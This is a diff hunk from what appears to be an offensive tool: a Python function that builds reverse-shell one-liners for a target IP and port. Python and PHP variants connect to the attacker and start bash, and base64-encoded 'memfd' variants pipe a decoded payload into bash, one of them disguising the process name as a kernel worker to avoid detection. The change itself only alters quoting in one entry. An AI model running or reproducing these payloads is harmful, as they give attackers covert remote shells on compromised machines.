@@ -32,7 +32,7 @@ def _build_payloads(ip: str, port: int) -> dict[str, str]:
         "python3":     f'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\'',
         "python":      f'python -c \'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\'',
         "php":         f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/bash -i <&3 >&3 2>&3");\'',
-        "memfd (bash)":        f'bash <(echo "{_b64_payload(ip, port)}" | base64 -d)',
+        "memfd (bash)":        f'bash <(echo {_b64_payload(ip, port)} | base64 -d)',
         "memfd (spoof argv)":  f'exec -a \'[kworker/0:1]\' bash <(echo "{_b64_payload(ip, port)}" | base64 -d)',
         "memfd (sh compat)":   f'bash <(printf \'%s\' "{_b64_payload(ip, port)}" | base64 -d)',
     }
